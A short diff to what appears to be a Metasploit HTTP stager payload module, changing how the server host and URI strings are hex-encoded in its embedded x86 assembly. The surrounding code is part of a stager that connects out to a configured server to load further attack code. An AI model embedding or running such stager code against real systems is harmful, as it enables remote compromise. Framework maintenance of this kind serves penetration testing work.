@@ -234,7 +234,7 @@ get_server_uri:
   call httpopenrequest
 
 server_uri:
- db "#{Rex::Text.hexify(uri.request_uri).chomp}?/12345", 0x00
+ db "#{Rex::Text.hexify(uri.request_uri, 99999).chomp}?/12345", 0x00
 
 failure:
   push 0x56A2B5F0        ; hardcoded to exitprocess for size
@@ -279,7 +279,7 @@ get_server_host:
   call internetconnect
 
 server_host:
-db "#{Rex::Text.hexify(uri.host).chomp}", 0x00
+db "#{Rex::Text.hexify(uri.host, 99999).chomp}", 0x00
 
 EOS
     self.module_info['Stager']['Assembly'] = payload_data.to_s
